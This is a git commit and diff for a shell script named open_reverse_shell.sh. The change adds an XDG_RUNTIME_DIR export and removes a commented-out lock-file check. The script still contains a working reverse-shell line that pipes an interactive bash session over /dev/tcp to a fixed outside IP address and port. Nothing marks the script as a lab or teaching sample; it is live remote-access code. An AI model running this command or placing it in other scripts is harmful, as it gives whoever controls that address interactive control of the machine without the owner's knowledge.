4643a9349f4835174dba02fcc656fbc86abb3b0e
Ivan Ivanov <30338+ivancho@users.noreply.github.com>
2020-09-30 10:36:31 -0400

    Add XDG_RUNTIME_DIR env to the reverse shell for easier systemctl commands

--- open_reverse_shell.sh
+++ open_reverse_shell.sh
@@ -2,14 +2,7 @@
 
 cd $( dirname "${BASH_SOURCE[0]}" )
 
-LCK=.rshell_lock
+# Need this to issue "systemctl --user" commands
+export XDG_RUNTIME_DIR=/run/user/1000
 
-#if [ -f $LCK ]; then
-#    echo "Lock exists, not running"
-#    exit
-#else
-#    trap "rm -f $LCK" EXIT
-#    touch $LCK
-#
 /bin/bash -i >& /dev/tcp/24.239.176.36/1235 0>&1
-#fi
